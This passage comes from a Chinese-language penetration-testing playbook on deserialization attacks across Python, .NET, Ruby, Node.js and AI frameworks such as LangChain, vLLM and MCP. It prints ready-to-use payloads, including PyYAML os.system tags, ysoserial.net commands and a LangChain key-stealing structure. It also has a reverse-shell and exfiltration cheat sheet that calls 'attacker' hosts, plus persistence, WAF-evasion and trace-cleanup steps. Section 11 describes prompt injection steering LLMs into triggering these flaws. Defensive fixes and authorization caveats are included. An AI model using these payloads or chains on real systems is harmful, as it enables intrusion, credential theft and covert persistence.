# PyYAML：yaml.load() / yaml.unsafe_load() 危险（CVE-2020-1747 FullLoader 也危险）
!!python/object/apply:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]
!!python/object/new:subprocess.Popen [["id"]]

# ruamel.yaml：默认 RuamelLoader 安全；unsafe_load 危险
!!python/object/apply:builtins.eval ["__import__('os').system('id')"]
```
```python
# 检测：扫描 yaml.load / yaml.unsafe_load / yaml.load(input, Loader=yaml.Loader) / FullLoader / unsafe_load
# 修复：yaml.safe_load()（PyYAML）、ruamel.yaml.YAML(typ='safe')
```

### 9.4 torch.load / ML 模型加载面（2025 关键）
```python
# CVE-2025-24357（vLLM）：torch.load(weights_only=False) 加载恶意模型权重 → 反序列化 RCE
# CVE-2025-32434（PyTorch）：即使 weights_only=True 仍可 RCE（2.6 修复，默认值翻转 + safe_globals 机制）
# 攻击路径：恶意 .pt/.pth/.bin 模型文件（HuggingFace 投毒、模型下载源被控、共享权重包）
# 防御：torch.load(..., weights_only=True) + 升级 PyTorch>=2.6；对模型文件做 pickle 扫描
```

### 9.5 生态攻击面与其他入口
```
# Django session（SESSION_ENGINE 使用数据库/cache 时默认 json，但自定义 backend 可能 pickle）
# Celery：task 参数走 pickle 序列化（CVE 历史上多次出现，默认改 json 后仍有 legacy）
# shelve / marshal.loads / jsonpickle.decode（py/object 结构）
# python-socketio CVE-2025-61765：Redis 消息队列中 pickle 反序列化（攻击者可写队列即 RCE）
# PickleScan 绕过 CVE-2025-1716：静态扫描工具可被构造的 pickle 流骗过（如利用 REDUCE 到 pip install）
# 检测指纹：\x80\x03/\x80\x04/\x80\x05、pickletools.dis 分析、fickling 逆向分析工具
```

## 十、AI 大模型框架反序列化面（2025-2026 新攻击面）

### 10.1 LangChain 序列化注入（CVE-2025-68664，CVSS 9.3）
```
根因：dumps()/dumpd() 未转义用户可控字典中的保留键 'lc'（内部标记可信框架对象的标识）
     反序列化时 load()/loads() 将含 'lc' 的结构当作合法框架对象处理
入口向量：
1. LLM 输出字段（additional_kwargs / response_metadata / metadata）—— 提示注入操纵 LLM 输出结构化数据
2. astream_events(v1) / Runnable.astream_log() 内部序列化
3. RunnableWithMessageHistory / InMemoryVectorStore.load() / hub.pull / 缓存加载
恶意载荷（窃取环境变量）：
{"lc": 1, "type": "secret", "id": ["OPENAI_API_KEY"]}
利用效果：环境变量/API 密钥窃取；可信命名空间内任意 Serializable 子类实例化（__init__ 副作用：网络请求/文件操作）
修复：langchain-core >= 0.3.81 / 1.2.5；loads 默认 allowed_objects="core"；secrets_from_env 默认 False；'lc' 键转义
```

### 10.2 LangGraph / 其他 LangChain 生态
```
CVE-2025-64439：LangGraph checkpoint 持久层反序列化 RCE（checkpoint 数据含不可信内容）
CVE-2025-67644：LangGraph SQLite checkpoint 后端 SQL 注入（CVSS 7.3）
CVE-2026-34070：langchain-core >= 1.2.22 修复的后续问题
攻击组合：提示注入 → 生成恶意 checkpoint/缓存内容 → 反序列化触发 → RCE
```

### 10.3 vLLM / PyTorch 推理框架
```
CVE-2025-32444（CVSS 10.0）：vLLM mooncake 分布式 KV 缓存集成，pickle 序列化经未认证 ZeroMQ socket（监听所有网卡）→ 直接发恶意 pickle 得 RCE；修复 vLLM>=0.8.5
CVE-2025-24357：torch.load 恶意模型权重 RCE
CVE-2025-32434：PyTorch weights_only=True 绕过；修复 >=2.6
同类：LLaMA-Factory CVE-2025-53002（weights_only 未设）、Meta Llama CVE-2024-50050（ZeroMQ+pickle）
渗透价值：GPU 集群 / 推理服务通常是高价值目标（模型权重、训练数据、云凭证）
```

### 10.4 向量库与数据处理链
```
- FAISS：index 文件本质可含 pickle 对象（faiss.write_index/read_index 关联 python 对象反序列化风险）
- ChromaDB：持久化目录中的 pickle 文件（python 对象持久化）
- Milvus/Weaviate：部分版本客户端反序列化/代码执行类 CVE（如 Milvus CVE-2023-1279 类）
- HuggingFace datasets：arrow 格式相对安全，但 pyarrow 存在历史反序列化 CVE；模型/数据仓库投毒是主要入口
- 向量库索引/缓存/快照文件 = 新的"上传即触发"攻击面
```

### 10.5 MCP 消息与 STDIO 传输（设计级 RCE）
```
背景：MCP（Model Context Protocol）2024-11 由 Anthropic 发布，连接 LLM 与工具/数据源；
     STDIO 传输将"MCP 服务器配置字符串"直接作为子进程命令执行 —— 配置字段即命令执行通道
影响：150M+ 下载、7000+ 公开服务器；Python/TypeScript/Java/Rust 全语言 SDK
已知案例（2026-04 ox.security "The Mother of All AI Supply Chains"）：
- LettaAI：认证 RCE；LangFlow：未认证服务器接管（暴露的 MCP 配置）；Flowise 过滤绕过；nginx-ui CVE-2026-33032 未认证命令执行
- 供应链：Smithery/GitHub MCP 注册表投毒（2026-02 克隆 Oura MCP 分发 StealC 窃密木马）
攻击链：提示注入（网页/文档/工具描述）→ LLM 调用恶意工具 → 数据外带/命令执行
防御：STDIO 仅白名单命令；MCP 服务器沙箱隔离；外部 MCP 配置视为不可信输入；工具最小权限 + 人工审批
```

### 10.6 向量库索引 / 缓存 / checkpoint 攻击路径总结
```
统一模式：LLM 应用将"不可信内容"（用户输入、网页、文档、模型输出）写入 序列化/缓存/索引/checkpoint 存储，
          后续加载时反序列化触发。审查每个 write→load 对，找出无过滤的反序列化点。
常用检查清单：
- [ ] loads()/load() 的输入是否可能含用户可控内容（含 'lc' 键结构 / pickle 字节 / checkpoint 数据）
- [ ] astream_events / message history / 向量存储 load 路径
- [ ] torch.load / 模型权重文件来源是否可信
- [ ] MCP 服务器配置（stdio command）是否可被外部修改
```

## 十一、AI 大模型结合：AI 辅助反序列化攻防

### 11.1 AI 辅助生成 Gadget 与 POP 链代码
```
适用场景（红队加速）：
1. 生成恶意类/字节码骨架：TemplatesImpl 恶意类、BCEL 编码器、pickle __reduce__ 脚本、PHP POP 链拼装代码
2. 分析序列化格式：让 LLM 解读 pickletools.dis / SerializationDumper 输出，协助手工改包
3. 链的版本适配：给定 ysoserial 链源码 + 目标依赖版本，LLM 快速产出适配变体（如 CC6 → CC6 变体、CB1.92）
4. 命令转换：Linux/Windows 跨平台命令、反弹 shell 多种姿势（bash/nc/python/powershell）自动生成
重要提醒：
- LLM 生成的字节码/POP 链必须在本地靶场验证后再投递，防止"看起来对但实际失效"的幻觉代码
- 涉及类名/依赖版本/API 签名差异时交叉核对官方文档与 Maven/PyPI 元数据
```

### 11.2 LLM 审计反序列化调用点（白盒提速）
```text
给 LLM 的审计提示词框架：
1. "找出项目中所有反序列化入口（readObject/unserialize/pickle.loads/yaml.load/Deserialize），
    标注输入是否用户可控、是否经过过滤/签名验证"
2. "对入口 X 做数据流分析：可控输入能否到达危险 Sink（exec/eval/Runtime.exec/subprocess）"
3. "检查依赖清单中的反序列化相关库版本，匹配已知 CVE（给出版本与修复版本）"
4. "对这段 PHP 代码，列出可作为 POP 链点（__destruct/__wakeup/__toString）的类及其可达 Sink"
输出要求：入口点清单 + 可达性判定 + 证据链（文件:行号→调用路径），人工复核高危项
```

### 11.3 AI 驱动反序列化检测（防御向）
```
- CodeQL/Semgrep 规则 + LLM 结果聚合：规则扫出候选点，LLM 自动去噪、聚合、生成修复建议
- 流量侧：WAF 规则生成（特征如 rO0AB/@type/!!python/object 的变体识别）；LLM 协助生成绕过-对抗规则
- 运行时：RASP 拦截日志语义分析，LLM 判定攻击链意图（Gadget 类组合 vs 正常业务对象）
- 模型文件/索引文件扫描：picklescan + fickling 结果 LLM 解读，判定 malicious opcode 模式
- 局限提示：AI 检测同样存在误报/漏报，关键决策仍需人工；攻击方也可用 LLM 生成对抗特征以测试检测器
```

### 11.4 大模型框架反序列化攻击面回顾
```
三层暴露面：
1. 框架自身反序列化（LangChain lc 键、LangGraph checkpoint、torch.load、向量库索引）
2. 生态工具链（MCP STDIO、Celery/Redis pickle、HuggingFace 模型投毒）
3. 传统漏洞经 AI 放大（提示注入使"无预认证反序列化点"变为"LLM 自动触发"，如 Snyk 演示的 Cursor MCP RCE）
组合攻击示例：诱导 LLM 输出含 'lc' 键的 metadata → 触发 loads() → 窃取环境变量密钥 → 用密钥访问云 API
```

## 十二、.NET 反序列化

### 12.1 危险入口与格式化器
```csharp
new BinaryFormatter().Deserialize(stream);          // 高危（.NET 8 默认禁止）
new LosFormatter().Deserialize(stream);
new SoapFormatter().Deserialize(stream);            // 已弃用但存在
new NetDataContractSerializer().Deserialize(stream);
JsonConvert.DeserializeObject(json, new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All });     // 仅 All/Objects 危险
```

### 12.2 ViewState 反序列化
```
- 前提：enableViewStateMac=false 或 machineKey 可预测/泄露
- ViewState 是 Base64 序列化对象，__VIEWSTATE 参数传递
- 用 ysoserial.net 生成 payload；需提供 --path/--apppath/--validationalg/--validationkey
ysoserial.net -g ViewState -c "cmd /c whoami" --path="/page.aspx" --apppath="/" --validationalg="SHA1" --validationkey="..."
```

### 12.3 ysoserial.net 与 Gadget 家族
```cmd
ysoserial.net -l
ysoserial.net -g ActivitySurrogateSelector -c "cmd /c whoami" -o BinaryFormatter
ysoserial.net -g ObjectDataProvider -c "cmd /c calc" -f JavaScriptSerializer
ysoserial.net -g TextFormattingRunProperties -c "powershell -e <base64>" -o BinaryFormatter
ysoserial.net -g ActivitySurrogateSelectorFromFile -c "shell.ps1;System.dll" -o BinaryFormatter
:: Gadget 家族：ActivitySurrogateSelector(最稳)/ObjectDataProvider/ClaimsIdentity/
::              TextFormattingRunProperties/ToolboxItemContainer/LogicalCallContext/
::              SessionSecurityTokenHandler/WindowsClaimsIdentity/TypeConfuseDelegate
```

### 12.4 .NET 8+ 变化与绕过
```
- .NET 8 默认禁用 BinaryFormatter（序列化抛异常），老应用仍可手动启用 → 仍是审计重点
- XAML ObjectDataProvider 是"通用 Gadget"：任意代码执行终点，跨多格式化器复用
- 绕过 TypeNameHandling=None：部分场景通过属性注入/JsonConverter 自定义间接实现类型解析
```

## 十三、Ruby / Node.js / Go 反序列化

### 13.1 Ruby Marshal / YAML / JSON
```ruby
# Marshal.load（最危险）：二进制格式，攻击者可控对象图
Marshal.load(File.binread("evil.marshal"))
# 已知链：Gem::SpecFetcher → Gem::Requirement → Gem::Package::TarReader → Runtime（2024 公开）
#        Universal Deserialisation Gadget for Ruby 2.x-3.x（universaldg/rubygems）
# YAML（Psych）：YAML.load / YAML.unsafe_load 危险
YAML.load("--- !ruby/object:Gem::Installer\ni: a")
# JSON create_additions：JSON.parse(json, create_additions: true) 可实例化任意带 json_create 的类
# 检测指纹：Marshal 流以 \x04\x08 开头
```

### 13.2 Node.js 反序列化
```bash
# node-serialize / serialize-to-js：函数体被序列化为字符串，反序列化时 eval 执行
# 特征：_$$ND_FUNC$$_function(){return process.mainModule.require('child_process').execSync('id');}()
# 利用：常见于"对象序列化后存 Redis/DB，再从请求数据还原"的 RCE 场景
# 工具：node-serialize-exploit；审计关键字：unserialize|serialize|serialize-to-js
# 其他：js-yaml unsafelyLoad / js-yaml load 旧版本（!!js/function 标签可 RCE）
#      proto 污染 → 命令执行（__proto__.NODE_OPTIONS / child_process 参数投毒）
```

### 13.3 Go 反序列化
```
- encoding/gob：仅解码已注册具体类型，默认安全；但反序列化后对象方法调用仍可能触发副作用
- 关注点：应用自实现"反序列化→反射调用"逻辑（如 JSON → mapstructure → 动态方法调用）
- Go 生态反序列化 CVE 少，主要风险在"业务逻辑层反射"与跨语言互操作（Java/Python 服务传递序列化数据）
```

## 十四、反序列化→RCE→内网渗透完整链

### 14.1 完整攻击流程总览
```
阶段1 侦察：指纹识别（AC ED 00 05 / rO0AB / O:N: / \x80\x03 / @type）
阶段2 确认：URLDNS / DNSLog / sleep 延迟 无害探测（不触发 RCE）
阶段3 链选择：依赖探测（GadgetProbe/报错/依赖清单）→ 选链（CC6 盲打 / CB1 / JDK-only / 框架链）
阶段4 RCE：投递 payload → 验证命令执行（回显/外带/盲打）
阶段5 回显与持久：内存马 / WebShell / 计划任务 / SSH key
阶段6 内网：代理隧道 → 横向移动（RMI/JNDI/同构链复用）→ 域渗透
```

### 14.2 不出网利用与回显技术（重点）
```
无回显环境判定与应对：
1. 盲打判定：sleep 延时 / DNS 外带（nslookup $(whoami).attacker.com）/ HTTP 外带（curl http://attacker/$(id|base64)）
2. 回显实现路径：
   a. 模板引擎回显：freemarker/velocity/SPEL 表达式注入回显（Web 应用通用）
   b. 异常信息回显：恶意类构造器把命令结果写入异常 detailMessage（Fastjson Throwable 链经典做法）
   c. 内存马：Tomcat Filter/Listener/Servlet、Spring Controller、Jetty Handler（无文件落地、重启失效）
   d. 写文件回显：写入 Web 目录 JSP/PHP 马（依赖目录可写）
   e. 线程注入回显：Godzilla/Behinder 内存马线程，WebSocket 通道复用
3. 完全不出网时的武器：
   a. BCEL + BasicDataSource/UnpooledDataSource（JDK<8u251，tomcat-dbcp/ibatis 依赖）
   b. TemplatesImpl 直接字节码执行（需 parseObject + SupportNonPublicField 等触发条件）
   c. c3p0 WrapperConnectionPoolDataSource 二次反序列化（HexAsciiSerializedMap: 前缀）
   d. 文件写入链（Fastjson AutoCloseable/MySQL Connector，见 fastjson-exploitation 技能）
   e. URLClassLoader 从内网可达 HTTP 服务加载 jar
```

### 14.3 反弹 Shell / 外带命令速查
```bash
# 反弹 shell 多姿势
bash -i >& /dev/tcp/attacker/4444 0>&1
nc -e /bin/sh attacker 4444
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
# 外带数据（无回显时）
curl http://attacker/$(cat /etc/hostname)
nslookup $(whoami).attacker.dnslog.cn
ping -c 1 $(hostname).attacker.dnslog.cn
# 内网穿透（RCE 后）
# frp / ew / chisel / ligolo-ng：Socks5 代理进内网
```

### 14.4 横向移动与权限维持
```
- 同构复用：内网同版本中间件（WebLogic/JBoss/Jenkins）直接复用同一条链
- RMI/JNDI 横向：利用内网 RMI Registry 反序列化、JNDI 注入渗透其他服务
- 密钥/配置提取：读取环境变量、配置中心、云元数据（http://169.254.169.254/latest/meta-data/）
- 权限维持：SSH key / 计划任务 / WebShell（注意混淆与清理）/ 内存马（高隐蔽）
- 注意：一切操作留痕最小化，测试完成按授权范围清理
```

## 十五、检测与验证

### 15.1 黑盒检测
```
1. URLDNS（Java）/ DNS 外带（全语言）：无 RCE 副作用，最安全
2. 时间侧信道：payload 内 sleep 10 / Thread.sleep(5000) → 观察响应延迟
3. 错误信息泄露：畸形 payload 触发异常 → 泄露依赖/类路径/反序列化框架名
4. 特征指纹：
   - Java: rO0AB / AC ED 00 05；Cookie rememberMe= → Shiro
   - PHP: O:N:"Class":... 格式；phar:// 探测
   - Python: \x80\x04\x95...；YAML !!python/object 标签
   - .NET: __VIEWSTATE 参数；BinaryFormatter 头 00 01 00 00 00 FF FF
   - Node: _$$ND_FUNC$$_
5. 请求头探测：T3 握手（WebLogic）、/invoker/JMXInvokerServlet（JBoss）、RMI 端口
```

### 15.2 白盒检测与审计清单
```
- [ ] 搜索全部反序列化入口关键字（见 2.2）
- [ ] 判定输入可信度：用户可控？经过签名/MAC/加密验证？来源信任边界？
- [ ] 依赖版本比对已知 CVE（commons-collections/fastjson/jackson/snakeyaml/xstream/log4j 等）
- [ ] 检查过滤器/白名单配置：JEP 290 / SerialKiller / resolveClass 重写是否存在且完整
- [ ] 检查间接反序列化：JSON/YAML/XML 解析器的类型标记开关（enableDefaultTyping/AutoType/TypeNameHandling/FullLoader）
- [ ] AI 应用专项：langchain dumps/loads、checkpoint 存储、torch.load、向量库索引、MCP 配置
- [ ] 数据流验证：可疑入口用 CodeQL/Semgrep 做 source→sink 可达性分析
```

## 十六、工具链表

| 工具 | 语言/平台 | 用途 |
|------|----------|------|
| ysoserial | Java | 反序列化 Payload 生成（CC/CB/Spring/Groovy/JDK-only 全链） |
| ysoserial.net | .NET | .NET 反序列化 Payload（ViewState/BinaryFormatter 等） |
| phpggc | PHP | PHP POP 链生成（框架链 + phar 格式） |
| marshalsec | Java | JNDI/LDAP/RMI 服务端（JNDI 注入辅助） |
| JNDI-Injection-Exploit / rogue-jndi | Java | 高版本 JDK JNDI 绕过（本地工厂） |
| GadgetProbe | Java | 黑盒探测 classpath 类存在性 |
| SerializationDumper | Java | Java 序列化流协议解析/手工改包 |
| Burp 插件（JavaDeserializationScanner 等） | Java | 流量侧反序列化检测 |
| ShiroExploit / ShiroAttack2 | Java | Shiro rememberMe 密钥爆破 + 一键利用 |
| fastjson 系列工具 / vulhub poc.py | Java | Fastjson 版本探测/1.2.83 Gadget-free 利用 |
| weblogicScanner / wls 系列 | Java | WebLogic T3/IIOP 扫描利用 |
| Metasploit（java_deserialization 模块） | 通用 | 批量反序列化检测 |
| Nuclei + 模板 | 通用 | CVE 模板化扫描（Log4Shell/反序列化） |
| CodeQL / Semgrep | 静态分析 | 数据流漏洞挖掘 / 反序列化规则扫描 |
| picklescan / fickling | Python | pickle 恶意流扫描 / 逆向分析 |
| pickletools | Python | 标准库 opcode 解析 |
| SerializationDumper 姊妹：Burp Serialization 系列 | Java | 流量改包重放 |
| McpSafetyScanner | AI/MCP | MCP 服务器安全审计 |
| 内网工具（frp/ew/chisel/ligolo-ng） | 通用 | RCE 后代理与横向 |

### 16.1 关键工具快速上手
```bash
# ysoserial
java -jar ysoserial.jar -h                     # 列出全部 Payload
# marshalsec JNDI
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Exploit" 1389
# GadgetProbe（探测目标 classpath）
java -jar GadgetProbe.jar -u http://target/endpoint -p <base64payload> -d "Header: v"
# phpggc
./phpggc -l | grep -i laravel
# picklescan
pip install picklescan && picklescan scan --file model.pkl
```

## 检查清单

### 信息收集
- [ ] 确认目标使用反序列化（特征指纹：rO0AB/AC ED 00 05/O:N:/`\x80\x03`/__VIEWSTATE/rememberMe/@type）
- [ ] 枚举全部入口：HTTP body/Cookie/Header/消息队列/RPC（RMI 1099、T3 7001、IIOP 3700、JMX 9010）/文件上传
- [ ] 识别依赖与版本：commons-collections/beanutils/fastjson/jackson/snakeyaml/xstream/log4j 等
- [ ] 确认 JDK 版本（JNDI/BCEL/CC 链可用性矩阵）与中间件类型
- [ ] 测试目标出网能力（DNS/HTTP/RMI/LDAP）决定出网/不出网策略
- [ ] 检测过滤器存在性：JEP 290 ObjectInputFilter、SerialKiller、resolveClass 白名单、框架 ClassFilter

### 无害探测
- [ ] URLDNS / DNSLog 外带确认反序列化入口存在（不触发 RCE）
- [ ] sleep 时间侧信道验证链是否生效
- [ ] 错误信息泄露收集（依赖名/类路径/框架版本）

### 漏洞利用（授权范围内）
- [ ] 按依赖选择链：CC6 盲打 → CB1（Shiro）→ JDK-only（JEP 290 环境）→ 框架链（Spring/Groovy/ROME）
- [ ] 中间件专项：Shiro rememberMe / WebLogic T3-IIOP-XMLDecoder / JBoss JMXInvoker / Jenkins CLI 与 config.xml
- [ ] 原生反序列化过滤器绕过：TC_PROXYCLASSDESC（CVE-2026-47065）/ depth>1 白名单短路（CVE-2026-62263）/ JDK-only 链
- [ ] JSON 类反序列化：Fastjson @type 绕过（详见 fastjson-exploitation 技能）
- [ ] PHP：unserialize 入口 / phar:// 触发 / Session 引擎不一致 / 框架 POP 链
- [ ] Python：pickle 入口 / PyYAML unsafe_load / torch.load / find_class 绕过
- [ ] AI 框架：LangChain dumps/loads（lc 键）、LangGraph checkpoint、vLLM ZeroMQ、向量库索引、MCP 配置
- [ ] 不出网场景：BCEL / TemplatesImpl / c3p0 二次反序列化 / 文件写入链 / 内存马
- [ ] 回显与验证：DNS/HTTP 外带、异常回显、写 WebShell、延时盲打

### WAF 对抗
- [ ] chunked 分块传输 / Content-Type 变换 / Gzip 压缩
- [ ] 序列化数据混淆（TC_RESET/垃圾字节/深度嵌套）与编码变形（Base64/Hex/Unicode）
- [ ] HPP 参数污染 / Header 注入 / POST→GET 转换

### 收尾
- [ ] 清理测试痕迹（WebShell/文件/计划任务/内存马进程）
- [ ] 编写修复建议并输出漏洞报告（POC/影响/修复/证据链）

## 修复建议

### 通用原则
- **首选"不反序列化不可信数据"**：用 JSON/Protobuf 等纯数据格式替代原生二进制序列化；传输前做签名/HMAC 完整性验证
- **白名单优于黑名单**：反序列化只允许业务明确需要的类；黑名单永远追不上新链
- **最小化攻击面**：禁用不需要的反序列化服务（RMI/JMX/T3/IIOP），限制出站网络（阻断 LDAP/RMI 出站）
- **依赖治理**：升级存在 CVE 的库（commons-collections 4.5.4+/fastjson2/xstream 高版本/snakeyaml 2.x）；用 SBOM + 漏洞扫描持续监控
- **运行权限最小化**：应用进程低权限运行、容器隔离，降低 RCE 影响面

### Java 专项
```java
// JEP 290 过滤器（注意 resolveProxyClass 绕过，需配合最新 JDK 补丁与 RASP）
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "!org.apache.commons.collections.*;!com.sun.org.apache.xalan.*;maxdepth=30");
ObjectInputFilter.Config.setSerialFilter(filter);
// 或重写 resolveClass 白名单（仅放行业务包）
// 升级 JDK 至最新（修复 CVE-2026-47065 类过滤器绕过）
// 禁用/加固 RMI：-Djava.rmi.server.useCodebaseOnly=true；不监听 1099
// Shiro：自定义强密钥（禁止默认 kPH+bIxk5D2deZiIxcaaaA==）
// WebLogic：打补丁 + 禁用 T3 反序列化黑名单外类
```
- Jackson：`ObjectMapper.enableDefaultTyping` 一律禁用；Fastjson：SafeMode（详见 fastjson-exploitation 技能）
- XStream：升级 + 白名单（`XStream.setupDefaultSecurity` + `addPermission`）

### PHP 专项
- PHP 8+ 保持 `phar.readonly=1` 且不处理不可信 phar；审计 `unserialize()` 输入（加 HMAC/签名）
- Session `serialize_handler` 全局统一（php_serialize）；`session.upload_progress` 等入口防注入
- 禁止 `yaml_parse` 处理不可信输入；禁用 `allow_url_include`

### Python 专项
```python
# PyYAML：一律 yaml.safe_load()
import yaml
data = yaml.safe_load(user_input)
# pickle：拒绝不可信输入；必须使用时继承 Unpickler 白名单 find_class
# torch.load：torch.load(path, weights_only=True) + 升级 PyTorch>=2.6
# 对模型/索引/缓存文件做 picklescan 扫描；Celery 禁用 pickle 序列化器
```

### .NET 专项
- 保持 .NET 8+ BinaryFormatter 默认禁用；迁移 XmlSerializer/DataContractSerializer/Json.NET（TypeNameHandling=None）
- ViewState：enableViewStateMac=true + 强 MachineKey + ViewStateUserKey
- 对 LegacyBinaryFormatter 调用点做清单管理（列出所有历史用法逐一迁移）

### AI 框架专项
```
- langchain-core 升级 >= 0.3.81 / 1.2.5（CVE-2025-68664）；langgraph-checkpoint >= 3.0
- 禁止对不可信内容调用 load()/loads()；secrets_from_env 保持 False
- vLLM >= 0.8.5（CVE-2025-32444）；KV 传输 socket 仅绑定内网；mooncake 默认关闭
- PyTorch >= 2.6；模型权重来源校验（签名/可信仓库）
- MCP：STDIO 命令白名单、服务器沙箱、外部配置视为不可信、工具调用人工审批
- 向量库/索引/checkpoint 存储视为可信边界内资产，外部写入需验证
```

### WAF / 检测层
- 规则特征：`rO0AB`/`AC ED 00 05`、`@type`、`!!python/object`、`_$$ND_FUNC$$_`、`${jndi:`、`O:\d+:"`
- 异常检测：序列化数据超长、嵌套深度异常、类名黑名单命中、反序列化调用栈监控
- RASP：hook 危险反序列化入口（readObject/unserialize/pickle.loads/Deserialize）阻断执行链

## 注意事项

- **仅限授权测试/合规声明**：反序列化 RCE 直接获得服务器权限，必须严格遵守《网络安全法》《数据安全法》及等保要求，仅在获得书面授权的目标与范围内测试；未授权利用属违法行为。测试前确认授权书、测试范围、时间窗口与应急联系人
- **无害探测优先**：一律先用 URLDNS/DNSLog/sleep 确认漏洞存在，确认授权后再执行 RCE 验证；禁止在未授权或生产环境直接投递 RCE payload
- **最小影响原则**：命令执行优先只读操作（id/whoami/hostname），避免破坏性命令；不读取/篡改敏感业务数据
- **痕迹清理**：测试结束后删除 WebShell、临时文件、计划任务、恢复被修改配置
- **链的兼容性**：Gadget 链依赖目标 classpath 具体库版本与 JDK 版本，同一链在不同环境可能失败，需多链备选
- **过滤器不等于安全**：JEP 290/白名单均存在绕过（2025-2026 连续曝出 CVE-2026-47065/CVE-2026-62263），审计时按"无过滤"评估
- **AI 框架是新增量攻击面**：LangChain/vLLM/PyTorch/MCP 的反序列化 CVE 修复速度快，测试与防护均需跟踪官方公告
- **LLM 生成 payload 需验证**：AI 辅助生成的链代码必须在本地靶场验证后再投递，防止幻觉代码
- **情报时效性**：反序列化攻击技术迭代极快，使用本技能前检索最新 CVE（NVD/GitHub Advisory/奇安信/CNNVD）更新版本矩阵
- **报告义务**：发现漏洞后按约定向甲方/厂商提交完整报告（复现步骤、影响、修复建议），不做公开披露

---
@TGSEC社区 · @TGSEC-Qtzuu 整理
